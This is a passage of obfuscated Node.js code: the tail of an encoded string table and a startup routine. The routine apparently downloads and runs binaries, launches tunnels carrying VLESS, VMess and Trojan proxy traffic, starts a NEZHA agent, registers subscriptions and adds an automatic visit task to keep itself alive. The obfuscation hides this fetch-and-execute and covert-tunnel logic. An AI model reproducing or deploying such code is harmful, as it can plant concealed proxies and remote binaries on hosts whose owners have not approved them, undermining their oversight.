_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','config.json','__proto__','UUID','.exe\x20>\x20nul\x202>&1','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','includes','base64','/vless-argo','all','\x20-c\x20\x22','toString','application/json','\x20is\x20created','vmess','existsSync','error','2131893RZQMxZ','\x20is\x20running','ARGO_DOMAIN:','trace','/api/add-subscriptions','/vmess-argo?ed=2560','automatic\x20access\x20task\x20added\x20successfully','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','pop','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','catch','NAME','/api/delete-nodes','PROJECT_URL','tunnel.json','4888BvxrFA','npm\x20running\x20error:\x20','SERVER_PORT','axios','NEZHA\x20variable\x20is\x20empty,skip\x20running','/trojan-argo','14792FezIft','info','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','chmod'];_0xa82f=function(){return _0x158922;};return _0xa82f();}async function startserver(){const _0x32398c=_0x20269a;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4e8f05){console[_0x32398c(0x1c2)](_0x32398c(0x18c),_0x4e8f05);}}startserver()[_0x20269a(0x1cd)](_0x10cbd9=>{const _0xb69c8=_0x20269a;console[_0xb69c8(0x1c2)](_0xb69c8(0x19a),_0x10cbd9);}),app[_0x20269a(0x1dc)](PORT,()=>console['log'](_0x20269a(0x1aa)+PORT+'!'));
